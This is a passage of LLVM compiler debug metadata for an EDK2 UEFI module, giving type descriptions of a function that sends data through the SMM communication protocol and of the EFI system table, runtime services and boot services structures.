!86 = !DIDerivedType(tag: DW_TAG_member, name: "Data4", scope: !78, file: !57, line: 217, baseType: !87, size: 64, offset: 64)
!87 = !DICompositeType(tag: DW_TAG_array_type, baseType: !88, size: 64, elements: !89)
!88 = !DIDerivedType(tag: DW_TAG_typedef, name: "UINT8", file: !53, line: 214, baseType: !62)
!89 = !{!90}
!90 = !DISubrange(count: 8)
!91 = !{!92, !93, !94, !95, !97, !113}
!92 = !DILocalVariable(name: "Guid", arg: 1, scope: !71, file: !72, line: 13, type: !75)
!93 = !DILocalVariable(name: "Data", arg: 2, scope: !71, file: !72, line: 14, type: !50)
!94 = !DILocalVariable(name: "DataSize", arg: 3, scope: !71, file: !72, line: 15, type: !58)
!95 = !DILocalVariable(name: "Status", scope: !71, file: !72, line: 18, type: !96)
!96 = !DIDerivedType(tag: DW_TAG_typedef, name: "EFI_STATUS", file: !76, line: 28, baseType: !56)
!97 = !DILocalVariable(name: "SmmCommunication", scope: !71, file: !72, line: 21, type: !98)
!98 = !DIDerivedType(tag: DW_TAG_pointer_type, baseType: !99, size: 64)
!99 = !DIDerivedType(tag: DW_TAG_typedef, name: "EFI_SMM_COMMUNICATION_PROTOCOL", file: !100, line: 21, baseType: !101)
!100 = !DIFile(filename: "MdePkg/Include/Protocol/SmmCommunication.h", directory: "/home/arun/Desktop/darpa_ex1/darpa_demo_edk2", checksumkind: CSK_MD5, checksum: "9caca2959a048506d44db17576284075")
!101 = !DIDerivedType(tag: DW_TAG_typedef, name: "EFI_MM_COMMUNICATION_PROTOCOL", file: !102, line: 43, baseType: !103)
!102 = !DIFile(filename: "MdePkg/Include/Protocol/MmCommunication.h", directory: "/home/arun/Desktop/darpa_ex1/darpa_demo_edk2", checksumkind: CSK_MD5, checksum: "f75635d145543cd744523801edc6e57b")
!103 = distinct !DICompositeType(tag: DW_TAG_structure_type, name: "_EFI_MM_COMMUNICATION_PROTOCOL", file: !102, line: 80, size: 64, elements: !104)
!104 = !{!105}
!105 = !DIDerivedType(tag: DW_TAG_member, name: "Communicate", scope: !103, file: !102, line: 81, baseType: !106, size: 64)
!106 = !DIDerivedType(tag: DW_TAG_typedef, name: "EFI_MM_COMMUNICATE", file: !102, line: 70, baseType: !107)
!107 = !DIDerivedType(tag: DW_TAG_pointer_type, baseType: !108, size: 64)
!108 = !DISubroutineType(types: !109)
!109 = !{!96, !110, !50, !112}
!110 = !DIDerivedType(tag: DW_TAG_pointer_type, baseType: !111, size: 64)
!111 = !DIDerivedType(tag: DW_TAG_const_type, baseType: !101)
!112 = !DIDerivedType(tag: DW_TAG_pointer_type, baseType: !58, size: 64)
!113 = !DILocalVariable(name: "Buffer", scope: !71, file: !72, line: 30, type: !114)
!114 = !DIDerivedType(tag: DW_TAG_pointer_type, baseType: !115, size: 64)
!115 = !DIDerivedType(tag: DW_TAG_typedef, name: "EFI_SMM_COMMUNICATE_HEADER", file: !100, line: 17, baseType: !116)
!116 = !DIDerivedType(tag: DW_TAG_typedef, name: "EFI_MM_COMMUNICATE_HEADER", file: !102, line: 34, baseType: !117)
!117 = distinct !DICompositeType(tag: DW_TAG_structure_type, name: "EFI_MM_COMMUNICATE_HEADER", file: !102, line: 21, size: 200, elements: !118)
!118 = !{!119, !120, !121}
!119 = !DIDerivedType(tag: DW_TAG_member, name: "HeaderGuid", scope: !117, file: !102, line: 25, baseType: !75, size: 128)
!120 = !DIDerivedType(tag: DW_TAG_member, name: "MessageLength", scope: !117, file: !102, line: 29, baseType: !58, size: 64, offset: 128)
!121 = !DIDerivedType(tag: DW_TAG_member, name: "Data", scope: !117, file: !102, line: 33, baseType: !122, size: 8, offset: 192)
!122 = !DICompositeType(tag: DW_TAG_array_type, baseType: !88, size: 8, elements: !123)
!123 = !{!124}
!124 = !DISubrange(count: 1)
!125 = !DILocation(line: 13, scope: !71)
!126 = !DILocation(line: 0, scope: !71)
!127 = !DILocation(line: 21, scope: !71)
!128 = !DILocation(line: 22, scope: !71)
!129 = !DILocation(line: 27, scope: !130)
!130 = distinct !DILexicalBlock(scope: !71, file: !72, line: 27)
!131 = !DILocation(line: 27, scope: !132)
!132 = distinct !DILexicalBlock(scope: !133, file: !72, line: 27)
!133 = distinct !DILexicalBlock(scope: !134, file: !72, line: 27)
!134 = distinct !DILexicalBlock(scope: !135, file: !72, line: 27)
!135 = distinct !DILexicalBlock(scope: !136, file: !72, line: 27)
!136 = distinct !DILexicalBlock(scope: !130, file: !72, line: 27)
!137 = !DILocation(line: 27, scope: !138)
!138 = distinct !DILexicalBlock(scope: !139, file: !72, line: 27)
!139 = distinct !DILexicalBlock(scope: !140, file: !72, line: 27)
!140 = distinct !DILexicalBlock(scope: !132, file: !72, line: 27)
!141 = !DILocation(line: 27, scope: !142)
!142 = distinct !DILexicalBlock(scope: !143, file: !72, line: 27)
!143 = distinct !DILexicalBlock(scope: !138, file: !72, line: 27)
!144 = !DILocation(line: 27, scope: !133)
!145 = !DILocation(line: 30, scope: !71)
!146 = !DILocation(line: 31, scope: !71)
!147 = !DILocation(line: 32, scope: !71)
!148 = !DILocation(line: 33, scope: !71)
!149 = !DILocation(line: 35, scope: !71)
!150 = !DILocation(line: 41, scope: !71)
!151 = !DILocation(line: 42, scope: !71)
!152 = distinct !DISubprogram(name: "UefiMain", scope: !72, file: !72, line: 46, type: !153, scopeLine: 50, flags: DIFlagPrototyped, spFlags: DISPFlagDefinition | DISPFlagOptimized, unit: !0, retainedNodes: !648)
!153 = !DISubroutineType(types: !154)
!154 = !{!96, !155, !156}
!155 = !DIDerivedType(tag: DW_TAG_typedef, name: "EFI_HANDLE", file: !76, line: 32, baseType: !50)
!156 = !DIDerivedType(tag: DW_TAG_pointer_type, baseType: !157, size: 64)
!157 = !DIDerivedType(tag: DW_TAG_typedef, name: "EFI_SYSTEM_TABLE", file: !12, line: 2058, baseType: !158)
!158 = distinct !DICompositeType(tag: DW_TAG_structure_type, name: "EFI_SYSTEM_TABLE", file: !12, line: 1997, size: 960, elements: !159)
!159 = !{!160, !169, !172, !173, !174, !198, !199, !254, !255, !256, !382, !640, !641}
!160 = !DIDerivedType(tag: DW_TAG_member, name: "Hdr", scope: !158, file: !12, line: 2001, baseType: !161, size: 192)
!161 = !DIDerivedType(tag: DW_TAG_typedef, name: "EFI_TABLE_HEADER", file: !4, line: 172, baseType: !162)
!162 = distinct !DICompositeType(tag: DW_TAG_structure_type, name: "EFI_TABLE_HEADER", file: !4, line: 145, size: 192, elements: !163)
!163 = !{!164, !165, !166, !167, !168}
!164 = !DIDerivedType(tag: DW_TAG_member, name: "Signature", scope: !162, file: !4, line: 151, baseType: !59, size: 64)
!165 = !DIDerivedType(tag: DW_TAG_member, name: "Revision", scope: !162, file: !4, line: 158, baseType: !81, size: 32, offset: 64)
!166 = !DIDerivedType(tag: DW_TAG_member, name: "HeaderSize", scope: !162, file: !4, line: 162, baseType: !81, size: 32, offset: 96)
!167 = !DIDerivedType(tag: DW_TAG_member, name: "CRC32", scope: !162, file: !4, line: 167, baseType: !81, size: 32, offset: 128)
!168 = !DIDerivedType(tag: DW_TAG_member, name: "Reserved", scope: !162, file: !4, line: 171, baseType: !81, size: 32, offset: 160)
!169 = !DIDerivedType(tag: DW_TAG_member, name: "FirmwareVendor", scope: !158, file: !12, line: 2006, baseType: !170, size: 64, offset: 192)
!170 = !DIDerivedType(tag: DW_TAG_pointer_type, baseType: !171, size: 64)
!171 = !DIDerivedType(tag: DW_TAG_typedef, name: "CHAR16", file: !53, line: 201, baseType: !84)
!172 = !DIDerivedType(tag: DW_TAG_member, name: "FirmwareRevision", scope: !158, file: !12, line: 2011, baseType: !81, size: 32, offset: 256)
!173 = !DIDerivedType(tag: DW_TAG_member, name: "ConsoleInHandle", scope: !158, file: !12, line: 2016, baseType: !155, size: 64, offset: 320)
!174 = !DIDerivedType(tag: DW_TAG_member, name: "ConIn", scope: !158, file: !12, line: 2021, baseType: !175, size: 64, offset: 384)
!175 = !DIDerivedType(tag: DW_TAG_pointer_type, baseType: !176, size: 64)
!176 = !DIDerivedType(tag: DW_TAG_typedef, name: "EFI_SIMPLE_TEXT_INPUT_PROTOCOL", file: !177, line: 20, baseType: !178)
!177 = !DIFile(filename: "MdePkg/Include/Protocol/SimpleTextIn.h", directory: "/home/arun/Desktop/darpa_ex1/darpa_demo_edk2", checksumkind: CSK_MD5, checksum: "239cf4f3dddb25a8596c70fa738413fd")
!178 = distinct !DICompositeType(tag: DW_TAG_structure_type, name: "_EFI_SIMPLE_TEXT_INPUT_PROTOCOL", file: !177, line: 116, size: 192, elements: !179)
!179 = !{!180, !185, !196}
!180 = !DIDerivedType(tag: DW_TAG_member, name: "Reset", scope: !178, file: !177, line: 117, baseType: !181, size: 64)
!181 = !DIDerivedType(tag: DW_TAG_typedef, name: "EFI_INPUT_RESET", file: !177, line: 86, baseType: !182)
!182 = !DIDerivedType(tag: DW_TAG_pointer_type, baseType: !183, size: 64)
!183 = !DISubroutineType(types: !184)
!184 = !{!96, !175, !61}
!185 = !DIDerivedType(tag: DW_TAG_member, name: "ReadKeyStroke", scope: !178, file: !177, line: 118, baseType: !186, size: 64, offset: 64)
!186 = !DIDerivedType(tag: DW_TAG_typedef, name: "EFI_INPUT_READ_KEY", file: !177, line: 107, baseType: !187)
!187 = !DIDerivedType(tag: DW_TAG_pointer_type, baseType: !188, size: 64)
!188 = !DISubroutineType(types: !189)
!189 = !{!96, !175, !190}
!190 = !DIDerivedType(tag: DW_TAG_pointer_type, baseType: !191, size: 64)
!191 = !DIDerivedType(tag: DW_TAG_typedef, name: "EFI_INPUT_KEY", file: !177, line: 38, baseType: !192)
!192 = distinct !DICompositeType(tag: DW_TAG_structure_type, name: "EFI_INPUT_KEY", file: !177, line: 35, size: 32, elements: !193)
!193 = !{!194, !195}
!194 = !DIDerivedType(tag: DW_TAG_member, name: "ScanCode", scope: !192, file: !177, line: 36, baseType: !83, size: 16)
!195 = !DIDerivedType(tag: DW_TAG_member, name: "UnicodeChar", scope: !192, file: !177, line: 37, baseType: !171, size: 16, offset: 16)
!196 = !DIDerivedType(tag: DW_TAG_member, name: "WaitForKey", scope: !178, file: !177, line: 122, baseType: !197, size: 64, offset: 128)
!197 = !DIDerivedType(tag: DW_TAG_typedef, name: "EFI_EVENT", file: !76, line: 36, baseType: !50)
!198 = !DIDerivedType(tag: DW_TAG_member, name: "ConsoleOutHandle", scope: !158, file: !12, line: 2025, baseType: !155, size: 64, offset: 448)
!199 = !DIDerivedType(tag: DW_TAG_member, name: "ConOut", scope: !158, file: !12, line: 2030, baseType: !200, size: 64, offset: 512)
!200 = !DIDerivedType(tag: DW_TAG_pointer_type, baseType: !201, size: 64)
!201 = !DIDerivedType(tag: DW_TAG_typedef, name: "EFI_SIMPLE_TEXT_OUTPUT_PROTOCOL", file: !202, line: 27, baseType: !203)
!202 = !DIFile(filename: "MdePkg/Include/Protocol/SimpleTextOut.h", directory: "/home/arun/Desktop/darpa_ex1/darpa_demo_edk2", checksumkind: CSK_MD5, checksum: "685bec042927ad46d31bf42ae7f6ddcd")
!203 = distinct !DICompositeType(tag: DW_TAG_structure_type, name: "_EFI_SIMPLE_TEXT_OUTPUT_PROTOCOL", file: !202, line: 387, size: 640, elements: !204)
!204 = !{!205, !210, !215, !217, !222, !227, !229, !234, !239, !241}
!205 = !DIDerivedType(tag: DW_TAG_member, name: "Reset", scope: !203, file: !202, line: 388, baseType: !206, size: 64)
!206 = !DIDerivedType(tag: DW_TAG_typedef, name: "EFI_TEXT_RESET", file: !202, line: 167, baseType: !207)
!207 = !DIDerivedType(tag: DW_TAG_pointer_type, baseType: !208, size: 64)
!208 = !DISubroutineType(types: !209)
!209 = !{!96, !200, !61}
!210 = !DIDerivedType(tag: DW_TAG_member, name: "OutputString", scope: !203, file: !202, line: 390, baseType: !211, size: 64, offset: 64)
!211 = !DIDerivedType(tag: DW_TAG_typedef, name: "EFI_TEXT_STRING", file: !202, line: 192, baseType: !212)
!212 = !DIDerivedType(tag: DW_TAG_pointer_type, baseType: !213, size: 64)
!213 = !DISubroutineType(types: !214)
!214 = !{!96, !200, !170}
!215 = !DIDerivedType(tag: DW_TAG_member, name: "TestString", scope: !203, file: !202, line: 391, baseType: !216, size: 64, offset: 128)
!216 = !DIDerivedType(tag: DW_TAG_typedef, name: "EFI_TEXT_TEST_STRING", file: !202, line: 213, baseType: !212)
!217 = !DIDerivedType(tag: DW_TAG_member, name: "QueryMode", scope: !203, file: !202, line: 393, baseType: !218, size: 64, offset: 192)
!218 = !DIDerivedType(tag: DW_TAG_typedef, name: "EFI_TEXT_QUERY_MODE", file: !202, line: 236, baseType: !219)
!219 = !DIDerivedType(tag: DW_TAG_pointer_type, baseType: !220, size: 64)
!220 = !DISubroutineType(types: !221)
!221 = !{!96, !200, !58, !112, !112}
!222 = !DIDerivedType(tag: DW_TAG_member, name: "SetMode", scope: !203, file: !202, line: 394, baseType: !223, size: 64, offset: 256)
!223 = !DIDerivedType(tag: DW_TAG_typedef, name: "EFI_TEXT_SET_MODE", file: !202, line: 256, baseType: !224)
!224 = !DIDerivedType(tag: DW_TAG_pointer_type, baseType: !225, size: 64)
!225 = !DISubroutineType(types: !226)
!226 = !{!96, !200, !58}
!227 = !DIDerivedType(tag: DW_TAG_member, name: "SetAttribute", scope: !203, file: !202, line: 395, baseType: !228, size: 64, offset: 320)
!228 = !DIDerivedType(tag: DW_TAG_typedef, name: "EFI_TEXT_SET_ATTRIBUTE", file: !202, line: 277, baseType: !224)
!229 = !DIDerivedType(tag: DW_TAG_member, name: "ClearScreen", scope: !203, file: !202, line: 397, baseType: !230, size: 64, offset: 384)
!230 = !DIDerivedType(tag: DW_TAG_typedef, name: "EFI_TEXT_CLEAR_SCREEN", file: !202, line: 295, baseType: !231)
!231 = !DIDerivedType(tag: DW_TAG_pointer_type, baseType: !232, size: 64)
!232 = !DISubroutineType(types: !233)
!233 = !{!96, !200}
!234 = !DIDerivedType(tag: DW_TAG_member, name: "SetCursorPosition", scope: !203, file: !202, line: 398, baseType: !235, size: 64, offset: 448)
!235 = !DIDerivedType(tag: DW_TAG_typedef, name: "EFI_TEXT_SET_CURSOR_POSITION", file: !202, line: 318, baseType: !236)
!236 = !DIDerivedType(tag: DW_TAG_pointer_type, baseType: !237, size: 64)
!237 = !DISubroutineType(types: !238)
!238 = !{!96, !200, !58, !58}
!239 = !DIDerivedType(tag: DW_TAG_member, name: "EnableCursor", scope: !203, file: !202, line: 399, baseType: !240, size: 64, offset: 512)
!240 = !DIDerivedType(tag: DW_TAG_typedef, name: "EFI_TEXT_ENABLE_CURSOR", file: !202, line: 340, baseType: !207)
!241 = !DIDerivedType(tag: DW_TAG_member, name: "Mode", scope: !203, file: !202, line: 404, baseType: !242, size: 64, offset: 576)
!242 = !DIDerivedType(tag: DW_TAG_pointer_type, baseType: !243, size: 64)
!243 = !DIDerivedType(tag: DW_TAG_typedef, name: "EFI_SIMPLE_TEXT_OUTPUT_MODE", file: !202, line: 379, baseType: !244)
!244 = distinct !DICompositeType(tag: DW_TAG_structure_type, name: "EFI_SIMPLE_TEXT_OUTPUT_MODE", file: !202, line: 349, size: 192, elements: !245)
!245 = !{!246, !249, !250, !251, !252, !253}
!246 = !DIDerivedType(tag: DW_TAG_member, name: "MaxMode", scope: !244, file: !202, line: 353, baseType: !247, size: 32)
!247 = !DIDerivedType(tag: DW_TAG_typedef, name: "INT32", file: !53, line: 192, baseType: !248)
!248 = !DIBasicType(name: "int", size: 32, encoding: DW_ATE_signed)
!249 = !DIDerivedType(tag: DW_TAG_member, name: "Mode", scope: !244, file: !202, line: 362, baseType: !247, size: 32, offset: 32)
!250 = !DIDerivedType(tag: DW_TAG_member, name: "Attribute", scope: !244, file: !202, line: 366, baseType: !247, size: 32, offset: 64)
!251 = !DIDerivedType(tag: DW_TAG_member, name: "CursorColumn", scope: !244, file: !202, line: 370, baseType: !247, size: 32, offset: 96)
!252 = !DIDerivedType(tag: DW_TAG_member, name: "CursorRow", scope: !244, file: !202, line: 374, baseType: !247, size: 32, offset: 128)
!253 = !DIDerivedType(tag: DW_TAG_member, name: "CursorVisible", scope: !244, file: !202, line: 378, baseType: !61, size: 8, offset: 160)
!254 = !DIDerivedType(tag: DW_TAG_member, name: "StandardErrorHandle", scope: !158, file: !12, line: 2035, baseType: !155, size: 64, offset: 576)
!255 = !DIDerivedType(tag: DW_TAG_member, name: "StdErr", scope: !158, file: !12, line: 2040, baseType: !200, size: 64, offset: 640)
!256 = !DIDerivedType(tag: DW_TAG_member, name: "RuntimeServices", scope: !158, file: !12, line: 2044, baseType: !257, size: 64, offset: 704)
!257 = !DIDerivedType(tag: DW_TAG_pointer_type, baseType: !258, size: 64)
!258 = !DIDerivedType(tag: DW_TAG_typedef, name: "EFI_RUNTIME_SERVICES", file: !12, line: 1876, baseType: !259)
!259 = distinct !DICompositeType(tag: DW_TAG_structure_type, name: "EFI_RUNTIME_SERVICES", file: !12, line: 1833, size: 1088, elements: !260)
!260 = !{!261, !262, !291, !296, !302, !307, !323, !328, !335, !340, !345, !350, !356, !370, !377}
!261 = !DIDerivedType(tag: DW_TAG_member, name: "Hdr", scope: !259, file: !12, line: 1837, baseType: !161, size: 192)
!262 = !DIDerivedType(tag: DW_TAG_member, name: "GetTime", scope: !259, file: !12, line: 1842, baseType: !263, size: 64, offset: 192)
!263 = !DIDerivedType(tag: DW_TAG_typedef, name: "EFI_GET_TIME", file: !12, line: 821, baseType: !264)
!264 = !DIDerivedType(tag: DW_TAG_pointer_type, baseType: !265, size: 64)
!265 = !DISubroutineType(types: !266)
!266 = !{!96, !267, !284}
!267 = !DIDerivedType(tag: DW_TAG_pointer_type, baseType: !268, size: 64)
!268 = !DIDerivedType(tag: DW_TAG_typedef, name: "EFI_TIME", file: !76, line: 79, baseType: !269)
!269 = distinct !DICompositeType(tag: DW_TAG_structure_type, name: "EFI_TIME", file: !76, line: 67, size: 128, elements: !270)
!270 = !{!271, !272, !273, !274, !275, !276, !277, !278, !279, !282, !283}
!271 = !DIDerivedType(tag: DW_TAG_member, name: "Year", scope: !269, file: !76, line: 68, baseType: !83, size: 16)
!272 = !DIDerivedType(tag: DW_TAG_member, name: "Month", scope: !269, file: !76, line: 69, baseType: !88, size: 8, offset: 16)
!273 = !DIDerivedType(tag: DW_TAG_member, name: "Day", scope: !269, file: !76, line: 70, baseType: !88, size: 8, offset: 24)
!274 = !DIDerivedType(tag: DW_TAG_member, name: "Hour", scope: !269, file: !76, line: 71, baseType: !88, size: 8, offset: 32)
!275 = !DIDerivedType(tag: DW_TAG_member, name: "Minute", scope: !269, file: !76, line: 72, baseType: !88, size: 8, offset: 40)
!276 = !DIDerivedType(tag: DW_TAG_member, name: "Second", scope: !269, file: !76, line: 73, baseType: !88, size: 8, offset: 48)
!277 = !DIDerivedType(tag: DW_TAG_member, name: "Pad1", scope: !269, file: !76, line: 74, baseType: !88, size: 8, offset: 56)
!278 = !DIDerivedType(tag: DW_TAG_member, name: "Nanosecond", scope: !269, file: !76, line: 75, baseType: !81, size: 32, offset: 64)
!279 = !DIDerivedType(tag: DW_TAG_member, name: "TimeZone", scope: !269, file: !76, line: 76, baseType: !280, size: 16, offset: 96)
!280 = !DIDerivedType(tag: DW_TAG_typedef, name: "INT16", file: !53, line: 205, baseType: !281)
!281 = !DIBasicType(name: "short", size: 16, encoding: DW_ATE_signed)
!282 = !DIDerivedType(tag: DW_TAG_member, name: "Daylight", scope: !269, file: !76, line: 77, baseType: !88, size: 8, offset: 112)
!283 = !DIDerivedType(tag: DW_TAG_member, name: "Pad2", scope: !269, file: !76, line: 78, baseType: !88, size: 8, offset: 120)
!284 = !DIDerivedType(tag: DW_TAG_pointer_type, baseType: !285, size: 64)
!285 = !DIDerivedType(tag: DW_TAG_typedef, name: "EFI_TIME_CAPABILITIES", file: !12, line: 804, baseType: !286)
!286 = distinct !DICompositeType(tag: DW_TAG_structure_type, name: "EFI_TIME_CAPABILITIES", file: !12, line: 781, size: 96, elements: !287)
!287 = !{!288, !289, !290}
!288 = !DIDerivedType(tag: DW_TAG_member, name: "Resolution", scope: !286, file: !12, line: 788, baseType: !81, size: 32)
!289 = !DIDerivedType(tag: DW_TAG_member, name: "Accuracy", scope: !286, file: !12, line: 795, baseType: !81, size: 32, offset: 32)
!290 = !DIDerivedType(tag: DW_TAG_member, name: "SetsToZero", scope: !286, file: !12, line: 803, baseType: !61, size: 8, offset: 64)
!291 = !DIDerivedType(tag: DW_TAG_member, name: "SetTime", scope: !259, file: !12, line: 1843, baseType: !292, size: 64, offset: 256)
!292 = !DIDerivedType(tag: DW_TAG_typedef, name: "EFI_SET_TIME", file: !12, line: 838, baseType: !293)
!293 = !DIDerivedType(tag: DW_TAG_pointer_type, baseType: !294, size: 64)
!294 = !DISubroutineType(types: !295)
!295 = !{!96, !267}
!296 = !DIDerivedType(tag: DW_TAG_member, name: "GetWakeupTime", scope: !259, file: !12, line: 1844, baseType: !297, size: 64, offset: 320)
!297 = !DIDerivedType(tag: DW_TAG_typedef, name: "EFI_GET_WAKEUP_TIME", file: !12, line: 859, baseType: !298)
!298 = !DIDerivedType(tag: DW_TAG_pointer_type, baseType: !299, size: 64)
!299 = !DISubroutineType(types: !300)
!300 = !{!96, !301, !301, !267}
!301 = !DIDerivedType(tag: DW_TAG_pointer_type, baseType: !61, size: 64)
!302 = !DIDerivedType(tag: DW_TAG_member, name: "SetWakeupTime", scope: !259, file: !12, line: 1845, baseType: !303, size: 64, offset: 384)
!303 = !DIDerivedType(tag: DW_TAG_typedef, name: "EFI_SET_WAKEUP_TIME", file: !12, line: 881, baseType: !304)
!304 = !DIDerivedType(tag: DW_TAG_pointer_type, baseType: !305, size: 64)
!305 = !DISubroutineType(types: !306)
!306 = !{!96, !61, !267}
!307 = !DIDerivedType(tag: DW_TAG_member, name: "SetVirtualAddressMap", scope: !259, file: !12, line: 1850, baseType: !308, size: 64, offset: 448)
!308 = !DIDerivedType(tag: DW_TAG_typedef, name: "EFI_SET_VIRTUAL_ADDRESS_MAP", file: !12, line: 311, baseType: !309)
!309 = !DIDerivedType(tag: DW_TAG_pointer_type, baseType: !310, size: 64)
!310 = !DISubroutineType(types: !311)
!311 = !{!96, !58, !58, !81, !312}
!312 = !DIDerivedType(tag: DW_TAG_pointer_type, baseType: !313, size: 64)
!313 = !DIDerivedType(tag: DW_TAG_typedef, name: "EFI_MEMORY_DESCRIPTOR", file: !12, line: 159, baseType: !314)
!314 = distinct !DICompositeType(tag: DW_TAG_structure_type, name: "EFI_MEMORY_DESCRIPTOR", file: !12, line: 127, size: 320, elements: !315)
!315 = !{!316, !317, !319, !321, !322}
!316 = !DIDerivedType(tag: DW_TAG_member, name: "Type", scope: !314, file: !12, line: 133, baseType: !81, size: 32)
!317 = !DIDerivedType(tag: DW_TAG_member, name: "PhysicalStart", scope: !314, file: !12, line: 139, baseType: !318, size: 64, offset: 64)
!318 = !DIDerivedType(tag: DW_TAG_typedef, name: "EFI_PHYSICAL_ADDRESS", file: !76, line: 49, baseType: !59)
!319 = !DIDerivedType(tag: DW_TAG_member, name: "VirtualStart", scope: !314, file: !12, line: 145, baseType: !320, size: 64, offset: 128)
!320 = !DIDerivedType(tag: DW_TAG_typedef, name: "EFI_VIRTUAL_ADDRESS", file: !76, line: 54, baseType: !59)
!321 = !DIDerivedType(tag: DW_TAG_member, name: "NumberOfPages", scope: !314, file: !12, line: 152, baseType: !59, size: 64, offset: 192)
!322 = !DIDerivedType(tag: DW_TAG_member, name: "Attribute", scope: !314, file: !12, line: 158, baseType: !59, size: 64, offset: 256)
!323 = !DIDerivedType(tag: DW_TAG_member, name: "ConvertPointer", scope: !259, file: !12, line: 1851, baseType: !324, size: 64, offset: 512)
!324 = !DIDerivedType(tag: DW_TAG_typedef, name: "EFI_CONVERT_POINTER", file: !12, line: 406, baseType: !325)
!325 = !DIDerivedType(tag: DW_TAG_pointer_type, baseType: !326, size: 64)
!326 = !DISubroutineType(types: !327)
!327 = !{!96, !58, !51}
!328 = !DIDerivedType(tag: DW_TAG_member, name: "GetVariable", scope: !259, file: !12, line: 1856, baseType: !329, size: 64, offset: 576)
!329 = !DIDerivedType(tag: DW_TAG_typedef, name: "EFI_GET_VARIABLE", file: !12, line: 670, baseType: !330)
!330 = !DIDerivedType(tag: DW_TAG_pointer_type, baseType: !331, size: 64)
!331 = !DISubroutineType(types: !332)
!332 = !{!96, !170, !333, !334, !112, !50}
!333 = !DIDerivedType(tag: DW_TAG_pointer_type, baseType: !75, size: 64)
!334 = !DIDerivedType(tag: DW_TAG_pointer_type, baseType: !81, size: 64)
!335 = !DIDerivedType(tag: DW_TAG_member, name: "GetNextVariableName", scope: !259, file: !12, line: 1857, baseType: !336, size: 64, offset: 640)
!336 = !DIDerivedType(tag: DW_TAG_typedef, name: "EFI_GET_NEXT_VARIABLE_NAME", file: !12, line: 716, baseType: !337)
!337 = !DIDerivedType(tag: DW_TAG_pointer_type, baseType: !338, size: 64)
!338 = !DISubroutineType(types: !339)
!339 = !{!96, !112, !170, !333}
!340 = !DIDerivedType(tag: DW_TAG_member, name: "SetVariable", scope: !259, file: !12, line: 1858, baseType: !341, size: 64, offset: 704)
!341 = !DIDerivedType(tag: DW_TAG_typedef, name: "EFI_SET_VARIABLE", file: !12, line: 758, baseType: !342)
!342 = !DIDerivedType(tag: DW_TAG_pointer_type, baseType: !343, size: 64)
!343 = !DISubroutineType(types: !344)
!344 = !{!96, !170, !333, !81, !58, !50}
!345 = !DIDerivedType(tag: DW_TAG_member, name: "GetNextHighMonotonicCount", scope: !259, file: !12, line: 1863, baseType: !346, size: 64, offset: 768)
!346 = !DIDerivedType(tag: DW_TAG_typedef, name: "EFI_GET_NEXT_HIGH_MONO_COUNT", file: !12, line: 1102, baseType: !347)
!347 = !DIDerivedType(tag: DW_TAG_pointer_type, baseType: !348, size: 64)
!348 = !DISubroutineType(types: !349)
!349 = !{!96, !334}
!350 = !DIDerivedType(tag: DW_TAG_member, name: "ResetSystem", scope: !259, file: !12, line: 1864, baseType: !351, size: 64, offset: 832)
!351 = !DIDerivedType(tag: DW_TAG_typedef, name: "EFI_RESET_SYSTEM", file: !12, line: 1067, baseType: !352)
!352 = !DIDerivedType(tag: DW_TAG_pointer_type, baseType: !353, size: 64)
!353 = !DISubroutineType(types: !354)
!354 = !{null, !355, !96, !58, !50}
!355 = !DIDerivedType(tag: DW_TAG_typedef, name: "EFI_RESET_TYPE", file: !4, line: 140, baseType: !3)
!356 = !DIDerivedType(tag: DW_TAG_member, name: "UpdateCapsule", scope: !259, file: !12, line: 1869, baseType: !357, size: 64, offset: 896)
!357 = !DIDerivedType(tag: DW_TAG_typedef, name: "EFI_UPDATE_CAPSULE", file: !12, line: 1728, baseType: !358)
!358 = !DIDerivedType(tag: DW_TAG_pointer_type, baseType: !359, size: 64)
!359 = !DISubroutineType(types: !360)
!360 = !{!96, !361, !58, !318}
!361 = !DIDerivedType(tag: DW_TAG_pointer_type, baseType: !362, size: 64)
!362 = !DIDerivedType(tag: DW_TAG_pointer_type, baseType: !363, size: 64)
!363 = !DIDerivedType(tag: DW_TAG_typedef, name: "EFI_CAPSULE_HEADER", file: !12, line: 1674, baseType: !364)
!364 = distinct !DICompositeType(tag: DW_TAG_structure_type, name: "EFI_CAPSULE_HEADER", file: !12, line: 1653, size: 224, elements: !365)
!365 = !{!366, !367, !368, !369}
!366 = !DIDerivedType(tag: DW_TAG_member, name: "CapsuleGuid", scope: !364, file: !12, line: 1657, baseType: !75, size: 128)
!367 = !DIDerivedType(tag: DW_TAG_member, name: "HeaderSize", scope: !364, file: !12, line: 1663, baseType: !81, size: 32, offset: 128)
!368 = !DIDerivedType(tag: DW_TAG_member, name: "Flags", scope: !364, file: !12, line: 1669, baseType: !81, size: 32, offset: 160)
!369 = !DIDerivedType(tag: DW_TAG_member, name: "CapsuleImageSize", scope: !364, file: !12, line: 1673, baseType: !81, size: 32, offset: 192)
!370 = !DIDerivedType(tag: DW_TAG_member, name: "QueryCapsuleCapabilities", scope: !259, file: !12, line: 1870, baseType: !371, size: 64, offset: 960)
!371 = !DIDerivedType(tag: DW_TAG_typedef, name: "EFI_QUERY_CAPSULE_CAPABILITIES", file: !12, line: 1759, baseType: !372)
!372 = !DIDerivedType(tag: DW_TAG_pointer_type, baseType: !373, size: 64)
!373 = !DISubroutineType(types: !374)
!374 = !{!96, !361, !58, !375, !376}
!375 = !DIDerivedType(tag: DW_TAG_pointer_type, baseType: !59, size: 64)
!376 = !DIDerivedType(tag: DW_TAG_pointer_type, baseType: !355, size: 64)
!377 = !DIDerivedType(tag: DW_TAG_member, name: "QueryVariableInfo", scope: !259, file: !12, line: 1875, baseType: !378, size: 64, offset: 1024)
!378 = !DIDerivedType(tag: DW_TAG_typedef, name: "EFI_QUERY_VARIABLE_INFO", file: !12, line: 1790, baseType: !379)
!379 = !DIDerivedType(tag: DW_TAG_pointer_type, baseType: !380, size: 64)
!380 = !DISubroutineType(types: !381)
!381 = !{!96, !81, !375, !375, !375}
!382 = !DIDerivedType(tag: DW_TAG_member, name: "BootServices", scope: !158, file: !12, line: 2048, baseType: !383, size: 64, offset: 768)
!383 = !DIDerivedType(tag: DW_TAG_pointer_type, baseType: !384, size: 64)
!384 = !DIDerivedType(tag: DW_TAG_typedef, name: "EFI_BOOT_SERVICES", file: !12, line: 1977, baseType: !385)
!385 = distinct !DICompositeType(tag: DW_TAG_structure_type, name: "EFI_BOOT_SERVICES", file: !12, line: 1884, size: 3008, elements: !386)
